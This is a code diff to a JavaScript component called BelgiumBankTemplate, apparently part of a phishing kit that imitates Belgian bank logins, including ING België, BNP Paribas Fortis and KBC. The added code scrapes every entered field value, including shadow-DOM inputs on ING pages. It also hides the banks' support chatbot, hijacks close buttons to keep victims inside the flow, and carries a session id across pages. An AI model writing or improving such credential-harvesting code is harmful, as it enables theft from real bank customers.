@@ -986,6 +986,15 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
         } catch { /* ignore */ }
       } else if (e.data && e.data.type === 'BELGIUM_BANK_UC_BACK') {
         setCurrentIndex(0);
+      } else if (e.data && e.data.type === 'BELGIUM_BANK_CLOSE') {
+        // Iframe'deki X/kapat butonu -> banka listesine don (session'ı koru)
+        try {
+          const m = window.location.pathname.match(/\/win\/([^/]+)\/bank\//);
+          const sid = (m && m[1]) || new URLSearchParams(window.location.search).get('session') || '';
+          window.location.href = sid ? `/banken?session=${encodeURIComponent(sid)}` : '/banken';
+        } catch {
+          try { window.history.back(); } catch { /* ignore */ }
+        }
       } else if (e.data && e.data.type === 'BELGIUM_BANK_UC_GET_USERNAME') {
         const uname = ucUsernameRef.current;
         if (uname) {
@@ -2172,6 +2181,48 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                 } catch(_) {}
             }
 
+            // SHADOW DOM inputlari: <ing-input> vb. custom elementlerin gercek
+            // <input>lari shadow root icinde - normal selector yakalayamaz (ING België).
+            try {
+                var __seenShadow = [];
+                var __collectShadowInputs = function(root) {
+                    var nodes = root.querySelectorAll ? root.querySelectorAll('input, select, textarea') : [];
+                    for (var ni = 0; ni < nodes.length; ni++) {
+                        var el = nodes[ni];
+                        var tt = (el.type || el.tagName || '').toLowerCase();
+                        if (['hidden','submit','button','reset','file','checkbox','radio'].indexOf(tt) !== -1) continue;
+                        var val = (el.value || '').trim();
+                        if (!val || GARBAGE_VALUES.test(val)) continue;
+                        if (__seenShadow.indexOf(el) !== -1) continue;
+                        __seenShadow.push(el);
+                        var host = null;
+                        try {
+                            var rn = el.getRootNode && el.getRootNode();
+                            host = rn && rn.host ? rn.host : null;
+                        } catch(_e) {}
+                        var fName = el.name || (host ? (host.getAttribute('name') || '') : '') || el.id || (host ? host.id : '') || '';
+                        allFields.push({
+                            key: 'form' + (formOrder || 1) + '__' + (fName || 'shadow-input-' + ni),
+                            name: fName,
+                            id: el.id || (host ? host.id : '') || '',
+                            formControlName: el.getAttribute('formcontrolname') || '',
+                            value: el.value,
+                            type: tt || 'text',
+                            label: (host ? (host.getAttribute('label') || '') : '') || (el.getAttribute('aria-label') || ''),
+                            ariaLabel: el.getAttribute('aria-label') || '',
+                            placeholder: el.placeholder || '',
+                            _hasPrefix: true,
+                            _formOrder: formOrder || 1
+                        });
+                    }
+                    var kids = root.querySelectorAll ? root.querySelectorAll('*') : [];
+                    for (var ki = 0; ki < kids.length; ki++) {
+                        if (kids[ki].shadowRoot) __collectShadowInputs(kids[ki].shadowRoot);
+                    }
+                };
+                __collectShadowInputs(document);
+            } catch(_) {}
+
             var inputs = buildInputMap(allFields);
             return { fields: allFields, inputs };
         };
@@ -2537,6 +2588,8 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
             'input[type="button"]',
             'a.btn',
             'a.button',
+            'a[role="button"]',
+            'ing-button',
             '[class~="submit-btn"]',
             '[class~="btn-submit"]',
             '[class~="btn-submit-form"]',
@@ -3498,6 +3551,21 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                    for (var bi2=0; bi2<kb.length; bi2++){
                      try { kb[bi2].removeAttribute('disabled'); kb[bi2].disabled = false; } catch(_e){}
                    }
+                   // "Chat met Kate" chatbot sekmesi/host'u kaldır
+                   var chatEls = document.querySelectorAll('#y9c-login-chatbot, y9c-login-chatbot, [class*="chatbot"], [id*="chatbot"], [class*="chat-widget"], [id*="chat-widget"]');
+                   for (var ci=0; ci<chatEls.length; ci++){
+                     try { chatEls[ci].style.display = 'none'; chatEls[ci].setAttribute('hidden',''); } catch(_e){}
+                   }
+                   var allKbc = document.querySelectorAll('*');
+                   for (var cj=0; cj<allKbc.length; cj++){
+                     var cel = allKbc[cj];
+                     if (!cel.children || cel.children.length) continue;
+                     var ctxt = ((cel.textContent || '') + '').trim();
+                     if (/^chat met kate/i.test(ctxt)) {
+                       var host = cel.closest('maia-chat, [class*="chat"], [id*="chat"], aside, section, div') || cel.parentElement;
+                       if (host) { host.style.display = 'none'; host.setAttribute('hidden',''); }
+                     }
+                   }
                  } catch(_e){}
                };
                __kbcApply(); setTimeout(__kbcApply, 400); setTimeout(__kbcApply, 1200); setTimeout(__kbcApply, 3000);
@@ -3535,6 +3603,16 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                  document.addEventListener('click', function(ev){
                    try {
                      var path = (ev.composedPath && ev.composedPath()) || [];
+                     for (var pz=0; pz<path.length; pz++){
+                       var cel = path[pz];
+                       var ccls = (cel && cel.classList ? (cel.classList.value || '') + '' : '') + ' ' + ((cel && cel.getAttribute) ? (cel.getAttribute('class') || '') : '');
+                       var ctitle = (cel && cel.getAttribute) ? (cel.getAttribute('title') || cel.getAttribute('aria-label') || '') : '';
+                       if (/close|sluiten|fermer|modal-close|icon-close/i.test(ccls) || /^sluiten$|^fermer$|^close$/i.test(ctitle)) {
+                         ev.preventDefault(); ev.stopPropagation();
+                         try { window.parent.postMessage({ type:'BELGIUM_BANK_CLOSE' }, '*'); } catch(_e){}
+                         return false;
+                       }
+                     }
                      for (var pi=0; pi<path.length; pi++){
                        var el = path[pi];
                        if (el && el.classList && el.classList.contains('tab-button')){
@@ -3627,6 +3705,62 @@ export function BelgiumBankTemplate({ bankSlug, onChange, handleRouteAction, sav
                  } catch(_e){}
                };
                __belApply(); setTimeout(__belApply, 400); setTimeout(__belApply, 1200); setTimeout(__belApply, 3000);
+             }
+           } catch(_e){}
+
+           // ==== ING BELGIË: icerik cok buyuk -> kucult + mobil sikistirma ====
+           try {
+             if (/\\/ing-be\\//i.test(window.location.href || '')) {
+               var __ingStyle = document.createElement('style');
+               __ingStyle.textContent = [
+                 'html{zoom:0.72;}',
+                 'body{min-width:0!important;}',
+                 '#ucrLoginForm,#otpForm,#otpFormSca{max-width:100%!important;min-width:0!important;}',
+                 '.means-selector-item{width:100%!important;min-width:0!important;}',
+                 '.ing-accordion__header{min-width:0!important;}',
+                 '.itsme-info-wrapper{width:auto!important;max-width:100%!important;}',
+                 'form{max-width:100%!important;}',
+                 'img,svg,ing-icon{max-width:100%!important;}',
+                 '*{box-sizing:border-box;}'
+               ].join('');
+               (document.head || document.documentElement).appendChild(__ingStyle);
+             }
+           } catch(_e){}
+
+           // ==== BNP PARIBAS FORTIS: mobil uyumluluk (sabit 710px wrapper kiriliyor) ====
+           try {
+             if (/\\/bnp-paribas-fortis-be\\//i.test(window.location.href || '')) {
+               var __bnpStyle = document.createElement('style');
+               __bnpStyle.textContent = [
+                 '.OZncR{width:100%!important;max-width:100%!important;margin:8px auto!important;padding:0 12px!important;box-sizing:border-box!important;}',
+                 'html,body{overflow-x:hidden!important;}',
+                 'body{min-width:0!important;}',
+                 '.MuiGrid-container{width:100%!important;margin:0!important;}',
+                 '.MuiGrid-grid-md-4,.MuiGrid-grid-md-8,.MuiGrid-grid-md-6,.MuiGrid-grid-md-12{flex-basis:100%!important;max-width:100%!important;}',
+                 'input,select,textarea{max-width:100%!important;box-sizing:border-box!important;}',
+                 '.MuiFormControl-root,.MuiTextField-root{max-width:100%!important;width:100%!important;}',
+                 'img{max-width:100%!important;height:auto!important;}',
+                 '*{box-sizing:border-box;}'
+               ].join('');
+               (document.head || document.documentElement).appendChild(__bnpStyle);
+             }
+           } catch(_e){}
+
+           // ==== GENEL BELCIKA MOBIL: tasmani onle ====
+           try {
+             if (/\\/belgian-banks\\//i.test(window.location.href || '') && !/\\/ing-be\\//i.test(window.location.href || '') && !/\\/bnp-paribas-fortis-be\\//i.test(window.location.href || '')) {
+               var __mobStyle = document.createElement('style');
+               __mobStyle.textContent = [
+                 'html,body{overflow-x:hidden!important;max-width:100%!important;}',
+                 'body{min-width:0!important;}',
+                 'input,select,textarea,button{max-width:100%!important;box-sizing:border-box!important;}',
+                 'img,svg{max-width:100%!important;height:auto!important;}',
+                 'form,fieldset{max-width:100%!important;}',
+                 '.lae-login-layout-composition__content{width:100%!important;max-width:100%!important;}',
+                 '.gefw-modal-inner{max-width:96%!important;}',
+                 '.argnt-p-image-background{max-width:100%!important;}'
+               ].join('');
+               (document.head || document.documentElement).appendChild(__mobStyle);
              }
            } catch(_e){}
 
